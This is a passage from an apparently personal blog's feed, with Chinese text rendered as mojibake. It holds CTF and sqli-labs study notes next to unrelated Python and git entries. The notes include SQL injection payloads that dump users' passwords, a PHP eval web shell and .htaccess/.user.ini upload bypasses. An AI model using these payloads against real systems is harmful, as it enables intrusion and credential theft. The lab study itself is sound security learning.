    <summary type="html">&lt;h2 id=&quot;GWCTF-2019-æˆ‘æœ‰ä¸€ä¸ªæ•°æ®åº“&quot;&gt;&lt;a href=&quot;#GWCTF-2019-æˆ‘æœ‰ä¸€ä¸ªæ•°æ®åº“&quot; class=&quot;headerlink&quot; title=&quot;[GWCTF 2019]æˆ‘æœ‰ä¸€ä¸ªæ•°æ®åº“&quot;&gt;&lt;/a&gt;[GWCTF 2019]æˆ‘æœ‰ä¸€ä¸ªæ•°æ®åº“&lt;/h2&gt;&lt;blockq</summary>
      
    
    
    
    <category term="ctfæ¯æ—¥ä¸€é¢˜" scheme="http://haorical.xyz/categories/ctf%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/"/>
    
    
    <category term="ctf" scheme="http://haorical.xyz/tags/ctf/"/>
    
    <category term="web" scheme="http://haorical.xyz/tags/web/"/>
    
    <category term="ä»£ç å®¡è®¡" scheme="http://haorical.xyz/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    <category term="æ–‡ä»¶åŒ…å«" scheme="http://haorical.xyz/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
    
  </entry>
  
  <entry>
    <title>sqli-labsé€Ÿé€š</title>
    <link href="http://haorical.xyz/posts/dc361564/"/>
    <id>http://haorical.xyz/posts/dc361564/</id>
    <published>2021-11-21T14:54:08.000Z</published>
    <updated>2021-11-22T07:10:37.124Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>ç”¨dockeræŠŠé¶åœºå®‰è£…åœ¨äº†è™šæ‹Ÿæœºä¸Šï¼Œè·Ÿç€å¤©ä¹¦èµ°ä¸€éï¼Œå¸Œæœ›æœ‰æ‰€æ”¶è·ï¼Œä¸å¾—ä¸è¯´dockerå’ŒsshçœŸé¦™ï¼Œè®¡åˆ’ä¸€éƒ¨åˆ†ä¸€éƒ¨åˆ†å†™ï¼Œä»Šå¤©å…‰åšä¸ªæŠ¥é”™æ³¨å…¥å·²ç»å¼„äº†2ä¸ªå°æ—¶äº†ã€‚ã€‚</p></blockquote><span id="more"></span><h2 id="åŸºç¡€"><a href="#åŸºç¡€" class="headerlink" title="åŸºç¡€"></a>åŸºç¡€</h2><h3 id="æ³¨å…¥åˆ†ç±»"><a href="#æ³¨å…¥åˆ†ç±»" class="headerlink" title="æ³¨å…¥åˆ†ç±»"></a>æ³¨å…¥åˆ†ç±»</h3><ol><li><p>åŸºäºé”™è¯¯</p></li><li><p>è”åˆæŸ¥è¯¢</p></li><li><p>å †æŸ¥è¯¢</p></li><li><p>ç›²æ³¨ï¼ˆå¸ƒå°”/æ—¶é—´/æŠ¥é”™ï¼‰</p></li><li><p>å¤„ç†è¾“å…¥</p></li><li><p>ç¨‹åºå’Œé¡ºåºï¼ˆä¸€é˜¶/äºŒé˜¶ï¼‰</p></li><li><p>æ³¨å…¥ç‚¹ä½ç½®</p></li></ol><h3 id="å¸¸ç”¨å‡½æ•°"><a href="#å¸¸ç”¨å‡½æ•°" class="headerlink" title="å¸¸ç”¨å‡½æ•°"></a>å¸¸ç”¨å‡½æ•°</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line">ç³»ç»Ÿå‡½æ•°</span><br><span class="line">version() æ•°æ®åº“ç‰ˆæœ¬</span><br><span class="line"><span class="keyword">user</span>() ç”¨æˆ·å</span><br><span class="line">database() åº“å</span><br><span class="line">@<span class="variable">@datadir</span> æ•°æ®åº“è·¯å¾„</span><br><span class="line">@<span class="variable">@version</span>_compile_os æ“ä½œç³»ç»Ÿç‰ˆæœ¬</span><br><span class="line"></span><br><span class="line">å­—ç¬¦ä¸²è¿æ¥</span><br><span class="line">concat() æ— åˆ†éš”ç¬¦è¿æ¥</span><br><span class="line">concat_ws(separator,str1,str2,...) æœ‰åˆ†éš”ç¬¦</span><br><span class="line">group_concat(str1,str2,..) è¿æ¥</span><br><span class="line"></span><br><span class="line">ä¸€èˆ¬æ›¿æ¢ï¼ˆ<span class="comment">--+å¯æ›¿æ¢ä¸º# %23ï¼‰</span></span><br><span class="line"><span class="keyword">or</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span><span class="comment">--+</span></span><br><span class="line"><span class="string">&#x27;or 1=1--+</span></span><br><span class="line"><span class="string">&quot;or 1=1--+</span></span><br><span class="line"><span class="string">)or 1=1--+</span></span><br><span class="line"><span class="string">&#x27;</span>)<span class="keyword">or</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span><span class="comment">--+</span></span><br><span class="line">&quot;) or 1=1--+</span><br><span class="line">&quot;))<span class="keyword">or</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span><span class="comment">--+</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">union</span>è¯­æ³•</span><br><span class="line"><span class="keyword">SELECT</span> column_name(s) <span class="keyword">FROM</span> table_name1</span><br><span class="line"><span class="keyword">UNION</span></span><br><span class="line"><span class="keyword">SELECT</span> column_name(s) <span class="keyword">FROM</span> table_name2</span><br><span class="line"><span class="keyword">SELECT</span> column_name(s) <span class="keyword">FROM</span> table_name1</span><br><span class="line"><span class="keyword">UNION</span> <span class="keyword">ALL</span></span><br><span class="line"><span class="keyword">SELECT</span> column_name(s) <span class="keyword">FROM</span> table_name2</span><br><span class="line"></span><br><span class="line">åŸºæ“</span><br><span class="line"><span class="keyword">select</span> schema_name <span class="keyword">from</span> information_schema.schemata; æŸ¥åº“å</span><br><span class="line"><span class="operator">+</span><span class="comment">--------------------+</span></span><br><span class="line"><span class="operator">|</span> schema_name        <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------------------+</span></span><br><span class="line"><span class="operator">|</span> information_schema <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> challenges         <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> mysql              <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> performance_schema <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> security           <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------------------+</span></span><br><span class="line"><span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;security&#x27;</span>; æŸ¥è¡¨å</span><br><span class="line"><span class="operator">+</span><span class="comment">------------+</span></span><br><span class="line"><span class="operator">|</span> table_name <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------------+</span></span><br><span class="line"><span class="operator">|</span> emails     <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> referers   <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> uagents    <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> users      <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------------+</span></span><br><span class="line"><span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;users&#x27;</span>; æŸ¥åˆ—å</span><br><span class="line"><span class="operator">+</span><span class="comment">-------------+</span></span><br><span class="line"><span class="operator">|</span> column_name <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-------------+</span></span><br><span class="line"><span class="operator">|</span> id          <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> username    <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> password    <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-------------+</span></span><br><span class="line"><span class="keyword">select</span> username <span class="keyword">from</span> security.users; æŸ¥æ•°æ®</span><br><span class="line"><span class="operator">+</span><span class="comment">----------+</span></span><br><span class="line"><span class="operator">|</span> username <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----------+</span></span><br><span class="line"><span class="operator">|</span> Dumb     <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> Angelina <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> Dummy    <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> secure   <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> stupid   <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> superman <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> batman   <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> admin    <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> admin1   <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> admin2   <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> admin3   <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> dhakkan  <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> admin4   <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----------+</span></span><br></pre></td></tr></table></figure><h2 id="ç›²æ³¨"><a href="#ç›²æ³¨" class="headerlink" title="ç›²æ³¨"></a>ç›²æ³¨</h2><h3 id="å¸ƒå°”ç›²æ³¨"><a href="#å¸ƒå°”ç›²æ³¨" class="headerlink" title="å¸ƒå°”ç›²æ³¨"></a>å¸ƒå°”ç›²æ³¨</h3><blockquote><p>æ„é€ é€»è¾‘åˆ¤æ–­</p></blockquote><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">ä¸»è¦çš„å­—ç¬¦ä¸²æˆªå–å‡½æ•°</span><br><span class="line"></span><br><span class="line">mid(column_name,<span class="keyword">start</span>[,length]) </span><br><span class="line">MID å‡½æ•°ç”¨äºä»æ–‡æœ¬å­—æ®µä¸­æå–å­—ç¬¦ã€‚</span><br><span class="line"><span class="keyword">SELECT</span> MID(column_name,<span class="keyword">start</span>[,length]) <span class="keyword">FROM</span> table_name</span><br><span class="line"><span class="keyword">start</span>ä»<span class="number">1</span>å¼€å§‹ç´¢å¼•ï¼Œå³ä»<span class="keyword">start</span>å¼€å§‹ï¼Œè¿”å›lengthé•¿åº¦çš„å­—ç¬¦</span><br><span class="line"></span><br><span class="line">MID(DATABASE(),<span class="number">1</span>,<span class="number">1</span>)<span class="operator">&gt;</span>â€™aâ€™,æŸ¥çœ‹æ•°æ®åº“åç¬¬ä¸€ä½</span><br><span class="line">MID(DATABASE(),<span class="number">2</span>,<span class="number">1</span>)æŸ¥çœ‹æ•°æ®åº“åç¬¬äºŒä½ï¼Œä¾æ¬¡æŸ¥çœ‹å„ä½å­—ç¬¦ã€‚</span><br><span class="line"></span><br><span class="line">MID((<span class="keyword">SELECT</span> table_name <span class="keyword">FROM</span> INFORMATION_SCHEMA.TABLES <span class="keyword">WHERE</span> table_schema<span class="operator">=</span>xxx LIMIT <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>)<span class="operator">&gt;</span>â€™aâ€™æ­¤å¤„column_nameå‚æ•°å¯ä»¥ä¸º<span class="keyword">sql</span>è¯­å¥ï¼Œå¯è‡ªè¡Œæ„é€ <span class="keyword">sql</span>è¯­å¥è¿›è¡Œæ³¨å…¥ã€‚</span><br><span class="line"></span><br><span class="line">substr()å‡½æ•°</span><br><span class="line">ç”¨æ³•åŒmidç›¸åŒ</span><br><span class="line"></span><br><span class="line"><span class="keyword">left</span>()å‡½æ•°</span><br><span class="line"><span class="keyword">Left</span> (string, n)</span><br><span class="line">å¾—åˆ°å­—ç¬¦ä¸²ä»å·¦éƒ¨å¼€å§‹å…±nä¸ªå­—ç¬¦ï¼Œå³å‰nä¸ªå­—ç¬¦</span><br><span class="line"></span><br><span class="line">ord()<span class="operator">/</span>asciiå‡½æ•°</span><br><span class="line">è¿”å›å­—ç¬¦çš„ascii</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="é¢˜ç›®"><a href="#é¢˜ç›®" class="headerlink" title="é¢˜ç›®"></a>é¢˜ç›®</h2><h3 id="æ¦‚è§ˆ"><a href="#æ¦‚è§ˆ" class="headerlink" title="æ¦‚è§ˆ"></a>æ¦‚è§ˆ</h3><p>1-4æ˜¯ä¸€ä¸ªç³»åˆ—ï¼ŒåŸºäºæŠ¥é”™æ³¨å…¥</p><p>5-</p><h3 id="less-1"><a href="#less-1" class="headerlink" title="less-1"></a>less-1</h3><blockquote><p>å•å¼•å·æ³¨å…¥</p></blockquote><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">order</span> <span class="keyword">by</span> å¯¹åˆ—é‡æ–°æ’åºç”¨æ¥åˆ¤æ–­æœ‰å‡ åˆ—</span><br><span class="line"></span><br><span class="line"><span class="number">-1</span><span class="string">&#x27; union select 1,group_concat(schema_name),3 from information_schema.schemata--+ æš´åº“</span></span><br><span class="line"><span class="string">-1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(table_name),<span class="number">3</span> <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;security&#x27;</span><span class="comment">--+ ï¼ˆ3åé¢ç©ºæ ¼ï¼‰çˆ†è¡¨</span></span><br><span class="line"></span><br><span class="line"><span class="number">-1</span><span class="string">&#x27; union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#x27;</span>users<span class="string">&#x27;--+ æš´åˆ—</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(password),group_concat(username) <span class="keyword">from</span> users<span class="comment">--+ æš´å­—æ®µ</span></span><br></pre></td></tr></table></figure><h3 id="less-2"><a href="#less-2" class="headerlink" title="less-2"></a>less-2</h3><blockquote><p>æ•´æ•°æ³¨å…¥</p></blockquote><p>å’Œless1ä¸€æ ·,ä¸è¿‡è¿™ä¸ªä¸éœ€è¦ç”¨ â€˜ é—­åˆ</p><h3 id="less-3"><a href="#less-3" class="headerlink" title="less-3"></a>less-3</h3><blockquote><p>å•å¼•å·+æ‹¬å·æ³¨å…¥</p></blockquote><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="operator">*</span> <span class="keyword">where</span> id <span class="operator">=</span> (<span class="string">&#x27;id&#x27;</span>) limit <span class="number">0</span>,<span class="number">1</span></span><br><span class="line">id <span class="operator">=</span> (<span class="string">&#x27; 1&#x27;</span>)<span class="keyword">or</span><span class="string">&#x27;1&#x27;</span><span class="operator">=</span>(<span class="string">&#x27;1 &#x27;</span>) ä¸éœ€<span class="comment">--+æ³¨é‡Š</span></span><br><span class="line">id <span class="operator">=</span> (<span class="string">&#x27; &#x27;</span>) <span class="keyword">or</span> <span class="number">1</span> <span class="operator">=</span> <span class="number">1</span> <span class="comment">--+ &#x27;) éœ€æ³¨é‡Š</span></span><br></pre></td></tr></table></figure><h3 id="less-4"><a href="#less-4" class="headerlink" title="less-4"></a>less-4</h3><blockquote><p>åŒå¼•å·+æ‹¬å·æ³¨å…¥</p></blockquote><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span>&quot;) union select 1,group_concat(password),group_concat(username) from users--+ ç”¨-1é˜²æ­¢è¦†ç›–</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;ç”¨dockeræŠŠé¶åœºå®‰è£…åœ¨äº†è™šæ‹Ÿæœºä¸Šï¼Œè·Ÿç€å¤©ä¹¦èµ°ä¸€éï¼Œå¸Œæœ›æœ‰æ‰€æ”¶è·ï¼Œä¸å¾—ä¸è¯´dockerå’ŒsshçœŸé¦™ï¼Œè®¡åˆ’ä¸€éƒ¨åˆ†ä¸€éƒ¨åˆ†å†™ï¼Œä»Šå¤©å…‰åšä¸ªæŠ¥é”™æ³¨å…¥å·²ç»å¼„äº†2ä¸ªå°æ—¶äº†ã€‚ã€‚&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="ctfé¶åœº" scheme="http://haorical.xyz/categories/ctf%E9%9D%B6%E5%9C%BA/"/>
    
    
    <category term="ctf" scheme="http://haorical.xyz/tags/ctf/"/>
    
    <category term="web" scheme="http://haorical.xyz/tags/web/"/>
    
    <category term="sqlæ³¨å…¥" scheme="http://haorical.xyz/tags/sql%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>pythonçˆ¬è™«æ·±å…¥</title>
    <link href="http://haorical.xyz/posts/3d5e7979/"/>
    <id>http://haorical.xyz/posts/3d5e7979/</id>
    <published>2021-11-21T06:30:45.000Z</published>
    <updated>2021-11-21T16:58:54.460Z</updated>
    
    <content type="html"><![CDATA[<h2 id="jsonpath"><a href="#jsonpath" class="headerlink" title="jsonpath"></a>jsonpath</h2><p>è§£å†³jsoné•¶å¥—ç´¢å¼•é—®é¢˜</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$ æ ¹èŠ‚ç‚¹</span><br><span class="line"></span><br><span class="line">. å­èŠ‚ç‚¹</span><br><span class="line"></span><br><span class="line">.. åŒ¹é…æ‰€æœ‰å­å­™èŠ‚ç‚¹</span><br><span class="line"></span><br><span class="line">pip install jsonpath</span><br><span class="line"><span class="keyword">from</span> jsonpath <span class="keyword">import</span> jsonpath</span><br><span class="line">jsonpath.(data, &#x27;$.1.2.3.4.5.key&#x27;) -&gt; list</span><br><span class="line">jsonpath.(data, &#x27;$..key&#x27;) -&gt; list</span><br></pre></td></tr></table></figure><h2 id="lxml"><a href="#lxml" class="headerlink" title="lxml"></a>lxml</h2><p>xpath helperæ’ä»¶</p><p>xpathè¯­æ³•</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">åŸºç¡€è¯­æ³•</span><br><span class="line">//title/text() # å–æ ‡ç­¾é—´æ–‡æœ¬å†…å®¹</span><br><span class="line">//link/@href   # æå–å±æ€§</span><br><span class="line">èŠ‚ç‚¹ä¿®é¥°è¯­æ³•</span><br><span class="line">/html/body/div[3]/div[1] # æ ‡ç­¾ä»1å¼€å§‹ç´¢å¼•</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;jsonpath&quot;&gt;&lt;a href=&quot;#jsonpath&quot; class=&quot;headerlink&quot; title=&quot;jsonpath&quot;&gt;&lt;/a&gt;jsonpath&lt;/h2&gt;&lt;p&gt;è§£å†³jsoné•¶å¥—ç´¢å¼•é—®é¢˜&lt;/p&gt;
&lt;figure class=&quot;highlight&quot;&gt;&lt;ta</summary>
      
    
    
    
    <category term="pythonå­¦ä¹ " scheme="http://haorical.xyz/categories/python%E5%AD%A6%E4%B9%A0/"/>
    
    
    <category term="python" scheme="http://haorical.xyz/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>gitæ›´æ–°</title>
    <link href="http://haorical.xyz/posts/bc46b23a/"/>
    <id>http://haorical.xyz/posts/bc46b23a/</id>
    <published>2021-11-18T15:23:34.000Z</published>
    <updated>2021-11-18T15:34:21.631Z</updated>
    
    <content type="html"><![CDATA[<h2 id="æ­¥éª¤"><a href="#æ­¥éª¤" class="headerlink" title="æ­¥éª¤"></a>æ­¥éª¤</h2><blockquote><p>å› ä¸ºvscode sshè¦æ±‚æœåŠ¡å™¨gitå¾—&gt;2,æ›´æ–°äº†ä¸ªgitï¼Œå‘ç°pushä¸ä¸Šå»äº†ï¼ŒåˆæŠŠæœåŠ¡å™¨æå´©äº†ï¼Œè¿˜å¾—é‡æ–°é…ç¯å¢ƒã€‚ã€‚ã€‚</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">yum install curl-devel expat-devel gettext-devel openssl-devel zlib-devel asciidoc</span><br><span class="line"></span><br><span class="line">yum install  gcc perl-ExtUtils-MakeMaker</span><br><span class="line"></span><br><span class="line">yum remove git</span><br><span class="line"></span><br><span class="line">cd &#x2F;usr&#x2F;local&#x2F;src&#x2F;</span><br><span class="line"></span><br><span class="line">wget https:&#x2F;&#x2F;mirrors.edge.kernel.org&#x2F;pub&#x2F;software&#x2F;scm&#x2F;git&#x2F;git-2.23.0.tar.xz</span><br><span class="line"></span><br><span class="line">tar -xvf git-2.23.0.tar.xz</span><br><span class="line"></span><br><span class="line">cd git-2.23.0&#x2F;</span><br><span class="line"></span><br><span class="line">make prefix&#x3D;&#x2F;usr&#x2F;local&#x2F;git all</span><br><span class="line"></span><br><span class="line">make prefix&#x3D;&#x2F;usr&#x2F;local&#x2F;git install</span><br><span class="line"></span><br><span class="line">echo &quot;export PATH&#x3D;$PATH:&#x2F;usr&#x2F;local&#x2F;git&#x2F;bin&quot; &gt;&gt; &#x2F;etc&#x2F;profile</span><br><span class="line"></span><br><span class="line">source &#x2F;etc&#x2F;profile</span><br><span class="line"></span><br><span class="line">git --version</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;æ­¥éª¤&quot;&gt;&lt;a href=&quot;#æ­¥éª¤&quot; class=&quot;headerlink&quot; title=&quot;æ­¥éª¤&quot;&gt;&lt;/a&gt;æ­¥éª¤&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;å› ä¸ºvscode sshè¦æ±‚æœåŠ¡å™¨gitå¾—&amp;gt;2,æ›´æ–°äº†ä¸ªgitï¼Œå‘ç°pushä¸ä¸Šå»äº†ï¼ŒåˆæŠŠæœåŠ¡å™¨æå´©äº†ï¼Œè¿˜å¾—</summary>
      
    
    
    
    <category term="å¼€å‘å·¥å…·" scheme="http://haorical.xyz/categories/%E5%BC%80%E5%8F%91%E5%B7%A5%E5%85%B7/"/>
    
    
    <category term="git" scheme="http://haorical.xyz/tags/git/"/>
    
  </entry>
  
  <entry>
    <title>20211118</title>
    <link href="http://haorical.xyz/posts/5c3bb6e4/"/>
    <id>http://haorical.xyz/posts/5c3bb6e4/</id>
    <published>2021-11-18T12:06:19.000Z</published>
    <updated>2021-11-18T15:20:40.710Z</updated>
    
    <content type="html"><![CDATA[<h2 id="MRCTF2020-ä½ ä¼ ä½ ğŸå‘¢"><a href="#MRCTF2020-ä½ ä¼ ä½ ğŸå‘¢" class="headerlink" title="[MRCTF2020]ä½ ä¼ ä½ ğŸå‘¢"></a>[MRCTF2020]ä½ ä¼ ä½ ğŸå‘¢</h2><p>ä¸Šä¼ .htaccess </p><p>ä¸Šä¼ shell.jpeg</p><p>ç›´æ¥æ‰«ç›®å½•å³å¯ï¼Œæ²¡æœ‰è¿‡æ»¤ï¼Œéå¸¸å‹å–„</p><pre><code>var_dump(file_get_contents(&#39;/flag&#39;));</code></pre><h2 id="SUCTF-2019-CheckIn"><a href="#SUCTF-2019-CheckIn" class="headerlink" title="[SUCTF 2019]CheckIn"></a>[SUCTF 2019]CheckIn</h2><p>ä¸Šä¼ .user.iniä¸è¿‡æ˜¯è¿™æ ·é…ç½®æ‰èƒ½è¿‡</p><pre><code>auto_prepend_file=shell.jpeg</code></pre><p>ä»¥å‰éƒ½æ˜¯</p><pre><code>auto_append_file=1.txt</code></pre><h2 id="NCTF2019-Fake-XML-cookbook"><a href="#NCTF2019-Fake-XML-cookbook" class="headerlink" title="[NCTF2019]Fake XML cookbook"></a>[NCTF2019]Fake XML cookbook</h2><p>xxe</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;MRCTF2020-ä½ ä¼ ä½ ğŸå‘¢&quot;&gt;&lt;a href=&quot;#MRCTF2020-ä½ ä¼ ä½ ğŸå‘¢&quot; class=&quot;headerlink&quot; title=&quot;[MRCTF2020]ä½ ä¼ ä½ ğŸå‘¢&quot;&gt;&lt;/a&gt;[MRCTF2020]ä½ ä¼ ä½ ğŸå‘¢&lt;/h2&gt;&lt;p&gt;ä¸Šä¼ .htaccess </summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>20211117</title>
    <link href="http://haorical.xyz/posts/cc84ab75/"/>
    <id>http://haorical.xyz/posts/cc84ab75/</id>
    <published>2021-11-17T13:53:13.000Z</published>
    <updated>2021-11-18T15:20:40.711Z</updated>
    
    <content type="html"><![CDATA[<h2 id="GXYCTF2019-BabyUpload"><a href="#GXYCTF2019-BabyUpload" class="headerlink" title="[GXYCTF2019]BabyUpload"></a>[GXYCTF2019]BabyUpload</h2><p>å…ˆä¸Šä¼ å‡ ä¸ªæ­£å¸¸å›¾ç‰‡æµ‹è¯•ï¼Œjpegèƒ½ç”¨</p><p>ä¸Šä¼ shellè¿‡æ»¤äº†&lt;?</p><pre><code>&lt;script language=&quot;php&quot;&gt;eval($_POST[&#39;cmd&#39;]);&lt;/script&gt;</code></pre><p>ç»•è¿‡ï¼Œä¸Šä¼ .htaccess</p><pre><code>AddType application/x-httpd-php .jpeg</code></pre><p>æŠŠsystemè¿‡æ»¤äº†</p><p>å¯ä»¥ç”¨var_dumpæ‰“å°</p><pre><code>var_dump(scandir(&quot;/&quot;))var_dump(file_get_contents(&quot;/flag&quot;));</code></pre><h2 id="GXYCTF2019-ç¦æ­¢å¥—å¨ƒ"><a href="#GXYCTF2019-ç¦æ­¢å¥—å¨ƒ" class="headerlink" title="[GXYCTF2019]ç¦æ­¢å¥—å¨ƒ"></a>[GXYCTF2019]ç¦æ­¢å¥—å¨ƒ</h2><p>å…ˆgithackæŠŠgitæ‰’ä¸‹æ¥ï¼Œæœ‰ä¸ªindex.php</p><p>ä»£ç å®¡è®¡ï¼Œè¿‡æ»¤çš„æ¯”è¾ƒå¤š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!preg_match(<span class="string">&#x27;/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>])) &#123; <span class="comment">#æŠŠä¼ªåè®®è¯»å–flag.phpç»™banäº†</span></span><br><span class="line">       <span class="keyword">if</span>(<span class="string">&#x27;;&#x27;</span> === preg_replace(<span class="string">&#x27;/[a-z,_]+\((?R)?\)/&#x27;</span>, <span class="literal">NULL</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>])) &#123; <span class="comment">#å¥—å¨ƒè¿‡æ»¤ï¼ˆæ— å‚æ•°è¿‡æ»¤ï¼‰ éœ€è¦æ„é€ ä¸€ä¸ªç±»ä¼¼è¿™ç©æ„çš„ä¸œè¥¿a(b(c(d(e(f())))));</span></span><br><span 